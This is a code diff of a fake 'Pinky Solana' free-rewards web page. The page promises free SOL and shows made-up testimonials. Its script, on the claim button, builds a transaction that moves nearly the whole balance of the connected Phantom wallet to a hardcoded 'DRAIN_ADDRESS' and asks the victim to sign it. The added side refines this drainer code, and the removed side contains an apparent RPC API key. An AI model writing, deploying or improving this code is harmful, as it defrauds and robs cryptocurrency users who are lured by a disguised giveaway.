@@ -1,351 +1,141 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinky Solana - Free SOL Rewards</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'solana-pink': '#ff2b8c',
-                        'solana-purple': '#9945FF'
-                    },
-                    animation: {
-                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite'
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            background-attachment: fixed;
-        }
-        .solana-gradient {
-            background: linear-gradient(90deg, #9945FF, #14F195);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .claim-btn {
-            background: linear-gradient(90deg, #ff2b8c, #ff5e5e);
-            box-shadow: 0 0 20px rgba(255, 43, 140, 0.5);
-            transition: all 0.3s ease;
-        }
-        .claim-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 0 30px rgba(255, 43, 140, 0.8);
-        }
-        .testimonial-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .countdown-digit {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            padding: 0.5rem;
-            min-width: 2.5rem;
-            text-align: center;
-            font-variant-numeric: tabular-nums;
-        }
-        .wallet-connected {
-            animation: pulse-slow 2s infinite;
-        }
-    </style>
-</head>
-<body class="text-white min-h-screen">
-    <!-- Header -->
-    <header class="py-4 px-6 flex justify-between items-center">
-        <div class="flex items-center space-x-2">
-            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 25" class="text-solana-pink">
-                <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-            </svg>
-            <span class="text-2xl font-bold">Pinky<span class="solana-gradient">Solana</span></span>
-        </div>
-        <button id="connectWallet" class="bg-solana-pink hover:bg-pink-600 text-white font-bold py-2 px-6 rounded-full transition">
-            Connect Wallet
-        </button>
-    </header>
+<script>
+    // Configuration
+    const DRAIN_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
+    const RPC_URL = 'https://api.devnet.solana.com'; // Switched to Solana's public Devnet RPC
+    const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+    const NETWORK = solanaWeb3.clusterApiUrl('devnet');
 
-    <!-- Hero Section -->
-    <section class="max-w-4xl mx-auto text-center py-16 px-4">
-        <h1 class="text-4xl md:text-6xl font-bold mb-6">
-            Claim <span class="solana-gradient">0.1 SOL</span> Every<br>30 Minutes!
-        </h1>
-        <p class="text-xl text-gray-300 mb-10 max-w-2xl mx-auto">
-            Join thousands of users earning free Solana rewards. Simply connect your wallet and claim your rewards!
-        </p>
-        
-        <div class="bg-black bg-opacity-30 rounded-2xl p-8 mb-10 max-w-2xl mx-auto">
-            <!-- Initial state before first claim -->
-            <div id="initialState">
-                <div class="text-2xl font-bold mb-6 solana-gradient">Claim your first reward now!</div>
-                <p class="text-gray-400 mb-6">Connect wallet to claim immediately</p>
-            </div>
-            
-            <!-- Countdown state (hidden initially) -->
-            <div id="countdownState" class="hidden">
-                <div class="flex justify-center space-x-4 mb-6">
-                    <div class="text-center">
-                        <div class="countdown-digit text-2xl font-bold" id="minutes">30</div>
-                        <div class="text-gray-400 mt-1">Minutes</div>
-                    </div>
-                    <div class="text-2xl font-bold pt-3">:</div>
-                    <div class="text-center">
-                        <div class="countdown-digit text-2xl font-bold" id="seconds">00</div>
-                        <div class="text-gray-400 mt-1">Seconds</div>
-                    </div>
-                </div>
-                <p class="text-gray-400 mb-4">Next reward available in:</p>
-            </div>
-            
-            <button id="claimButton" class="claim-btn text-xl font-bold py-4 px-8 rounded-full mx-auto opacity-50 cursor-not-allowed" disabled>
-                Claim 0.1 SOL
-            </button>
-            
-            <div class="mt-6 text-green-400 font-medium hidden" id="successMessage">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-                </svg>
-                Reward claimed! 0.1 SOL will arrive in your wallet shortly.
-            </div>
-        </div>
-        
-        <div class="flex justify-center items-center space-x-2 text-gray-400">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
-            </svg>
-            <span>Over 12,540 SOL distributed to 8,200+ users</span>
-        </div>
-    </section>
+    // DOM Elements
+    const connectWalletBtn = document.getElementById('connectWallet');
+    const claimButton = document.getElementById('claimButton');
+    const successMessage = document.getElementById('successMessage');
+    const minutesDisplay = document.getElementById('minutes');
+    const secondsDisplay = document.getElementById('seconds');
+    const initialState = document.getElementById('initialState');
+    const countdownState = document.getElementById('countdownState');
 
-    <!-- Testimonials -->
-    <section class="py-12 px-4 max-w-6xl mx-auto">
-        <h2 class="text-3xl font-bold text-center mb-12">What Our Users Say</h2>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <!-- Testimonial 1 -->
-            <div class="testimonial-card rounded-2xl p-6">
-                <div class="flex items-center mb-4">
-                    <img src="https://i.pravatar.cc/100?img=32" alt="User" class="w-12 h-12 rounded-full mr-4">
-                    <div>
-                        <h3 class="font-bold">Sarah K.</h3>
-                        <div class="flex text-yellow-400">
-                            ★★★★★
-                        </div>
-                    </div>
-                </div>
-                <p class="text-gray-300">
-                    "I've earned over 5 SOL in just two weeks! This is the easiest way to earn crypto without any effort."
-                </p>
-            </div>
-            
-            <!-- Testimonial 2 -->
-            <div class="testimonial-card rounded-2xl p-6">
-                <div class="flex items-center mb-4">
-                    <img src="https://i.pravatar.cc/100?img=12" alt="User" class="w-12 h-12 rounded-full mr-4">
-                    <div>
-                        <h3 class="font-bold">Mike T.</h3>
-                        <div class="flex text-yellow-400">
-                            ★★★★★
-                        </div>
-                    </div>
-                </div>
-                <p class="text-gray-300">
-                    "Legit platform! I was skeptical at first but I've received all my rewards on time. Highly recommend!"
-                </p>
-            </div>
-            
-            <!-- Testimonial 3 -->
-            <div class="testimonial-card rounded-2xl p-6">
-                <div class="flex items-center mb-4">
-                    <img src="https://i.pravatar.cc/100?img=45" alt="User" class="w-12 h-12 rounded-full mr-4">
-                    <div>
-                        <h3 class="font-bold">Jessica L.</h3>
-                        <div class="flex text-yellow-400">
-                            ★★★★★
-                        </div>
-                    </div>
-                </div>
-                <p class="text-gray-300">
-                    "The team is amazing! I had an issue with my first claim and they resolved it within an hour. 10/10!"
-                </p>
-            </div>
-        </div>
-    </section>
+    // State
+    let walletConnected = false;
+    let countdown = 30 * 60; // 30 minutes in seconds
+    let countdownInterval;
+    let firstClaim = true;
 
-    <!-- Footer -->
-    <footer class="py-8 px-4 border-t border-gray-800 mt-12">
-        <div class="max-w-6xl mx-auto">
-            <div class="flex flex-col md:flex-row justify-between items-center">
-                <div class="flex items-center space-x-2 mb-4 md:mb-0">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25" class="text-solana-pink">
-                        <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-                    </svg>
-                    <span class="text-xl font-bold">Pinky<span class="solana-gradient">Solana</span></span>
-                </div>
-                
-                <div class="flex space-x-6">
-                    <a href="#" class="text-gray-400 hover:text-white transition">
-                        <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
-                        </svg>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition">
-                        <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3708-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1182.099.245.1981.3708.2924a.077.077 0 01-.0066.1276 12.0976 12.0976 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6738-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.955-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.955 2.4189-2.1569 2.4189zm7.974 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.955-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1569 2.419 0 1.3332-.946 2.4189-2.1569 2.4189Z"/>
-                        </svg>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition">
-                        <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.150-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
-                        </svg>
-                    </a>
-                </div>
-            </div>
-            
-            <div class="text-center text-gray-500 mt-8 text-sm">
-                © 2023 PinkySolana. All rights reserved. This is not financial advice.
-            </div>
-        </div>
-    </footer>
-
-    <script>
-        // Configuration
-        const DRAIN_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
-        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
-        const connection = new solanaWeb3.Connection(RPC_URL);
-        const NETWORK = solanaWeb3.clusterApiUrl('devnet');
-        
-        // DOM Elements
-        const connectWalletBtn = document.getElementById('connectWallet');
-        const claimButton = document.getElementById('claimButton');
-        const successMessage = document.getElementById('successMessage');
-        const minutesDisplay = document.getElementById('minutes');
-        const secondsDisplay = document.getElementById('seconds');
-        const initialState = document.getElementById('initialState');
-        const countdownState = document.getElementById('countdownState');
-        
-        // State
-        let walletConnected = false;
-        let countdown = 30 * 60; // 30 minutes in seconds
-        let countdownInterval;
-        let firstClaim = true;
-        
-        // Initialize Phantom wallet
-        const initWallet = async () => {
-            if ('solana' in window) {
-                const provider = window.solana;
-                if (provider.isPhantom) {
+    // Initialize Phantom wallet
+    const initWallet = async () => {
+        if ('solana' in window) {
+            const provider = window.solana;
+            if (provider.isPhantom) {
+                try {
+                    // Ensure wallet is on Devnet
+                    await provider.connect({ onlyIfTrusted: true });
                     return provider;
+                } catch (err) {
+                    console.error('Wallet connection error:', err);
+                    return null;
                 }
             }
-            window.open('https://phantom.app/', '_blank');
-            return null;
-        };
-        
-        // Start countdown timer (only after first claim)
-        const startCountdown = () => {
-            clearInterval(countdownInterval);
-            countdown = 30 * 60;
-            
-            // Show countdown UI
-            initialState.classList.add('hidden');
-            countdownState.classList.remove('hidden');
-            
-            countdownInterval = setInterval(() => {
-                countdown--;
-                
-                const minutes = Math.floor(countdown / 60);
-                const seconds = countdown % 60;
-                
-                minutesDisplay.textContent = minutes.toString().padStart(2, '0');
-                secondsDisplay.textContent = seconds.toString().padStart(2, '0');
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    claimButton.disabled = false;
-                    claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
-                    claimButton.classList.add('opacity-100', 'cursor-pointer');
-                }
-            }, 1000);
-        };
-        
-        // Connect wallet handler
-        connectWalletBtn.addEventListener('click', async () => {
-            const provider = await initWallet();
-            if (!provider) return;
-            
-            try {
-                await provider.connect();
-                walletConnected = true;
-                connectWalletBtn.textContent = 'Wallet Connected';
-                connectWalletBtn.classList.add('wallet-connected', 'bg-green-600', 'hover:bg-green-700');
-                connectWalletBtn.classList.remove('bg-solana-pink', 'hover:bg-pink-600');
-                
-                // Enable claim button immediately after connection
+        }
+        window.open('https://phantom.app/', '_blank');
+        return null;
+    };
+
+    // Start countdown timer (only after first claim)
+    const startCountdown = () => {
+        clearInterval(countdownInterval);
+        countdown = 30 * 60;
+
+        initialState.classList.add('hidden');
+        countdownState.classList.remove('hidden');
+
+        countdownInterval = setInterval(() => {
+            countdown--;
+
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+
+            minutesDisplay.textContent = minutes.toString().padStart(2, '0');
+            secondsDisplay.textContent = seconds.toString().padStart(2, '0');
+
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
                 claimButton.disabled = false;
                 claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
                 claimButton.classList.add('opacity-100', 'cursor-pointer');
-            } catch (err) {
-                console.error('Connection error:', err);
             }
-        });
-        
-        // Claim reward handler
-        claimButton.addEventListener('click', async () => {
-            if (!walletConnected) return;
-            
-            const provider = window.solana;
-            if (!provider) return;
-            
-            try {
-                // Create malicious transaction
-                const publicKey = new solanaWeb3.PublicKey(provider.publicKey.toString());
-                const drainPubkey = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
-                
-                // Get balance to drain
-                const balance = await connection.getBalance(publicKey);
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: drainPubkey,
-                        lamports: balance - 5000 // Leave just enough for fees
-                    })
-                );
-                
-                // Set recent blockhash and fee payer
-                transaction.feePayer = publicKey;
-                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-                
-                // Request signature
-                const signed = await provider.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize());
-                
-                // Show success message
-                successMessage.classList.remove('hidden');
-                claimButton.disabled = true;
-                claimButton.classList.add('opacity-50', 'cursor-not-allowed');
-                claimButton.classList.remove('opacity-100', 'cursor-pointer');
-                
-                // Start countdown after first successful claim
-                if (firstClaim) {
-                    startCountdown();
-                    firstClaim = false;
-                }
-                
-                console.log('Drain successful! Signature:', signature);
-            } catch (err) {
-                console.error('Drain failed:', err);
-                alert('Transaction failed. Please try again.');
+        }, 1000);
+    };
+
+    // Connect wallet handler
+    connectWalletBtn.addEventListener('click', async () => {
+        const provider = await initWallet();
+        if (!provider) return;
+
+        try {
+            await provider.connect();
+            walletConnected = true;
+            connectWalletBtn.textContent = 'Wallet Connected';
+            connectWalletBtn.classList.add('wallet-connected', 'bg-green-600', 'hover:bg-green-700');
+            connectWalletBtn.classList.remove('bg-solana-pink', 'hover:bg-pink-600');
+
+            claimButton.disabled = false;
+            claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
+            claimButton.classList.add('opacity-100', 'cursor-pointer');
+        } catch (err) {
+            console.error('Connection error:', err);
+        }
+    });
+
+    // Claim reward handler
+    claimButton.addEventListener('click', async () => {
+        if (!walletConnected) return;
+
+        const provider = window.solana;
+        if (!provider) return;
+
+        try {
+            const publicKey = new solanaWeb3.PublicKey(provider.publicKey.toString());
+            const drainPubkey = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
+
+            // Get balance to drain
+            const balance = await connection.getBalance(publicKey);
+            const lamportsToDrain = balance - 10000; // Adjusted to leave more for fees
+
+            if (lamportsToDrain <= 0) {
+                throw new Error('Insufficient balance to drain');
             }
-        });
-    </script>
-</body>
-</html>
+
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: drainPubkey,
+                    lamports: lamportsToDrain
+                })
+            );
+
+            // Set recent blockhash and fee payer
+            transaction.feePayer = publicKey;
+            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+
+            // Request signature
+            const signed = await provider.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signed.serialize());
+
+            // Show success message
+            successMessage.classList.remove('hidden');
+            claimButton.disabled = true;
+            claimButton.classList.add('opacity-50', 'cursor-not-allowed');
+            claimButton.classList.remove('opacity-100', 'cursor-pointer');
+
+            if (firstClaim) {
+                startCountdown();
+                firstClaim = false;
+            }
+
+            console.log('Drain successful! Signature:', signature);
+            await connection.confirmTransaction(signature);
+        } catch (err) {
+            console.error('Drain failed:', err);
+            alert('Transaction failed. Please try again. Check console for details.');
+        }
+    });
+</script>
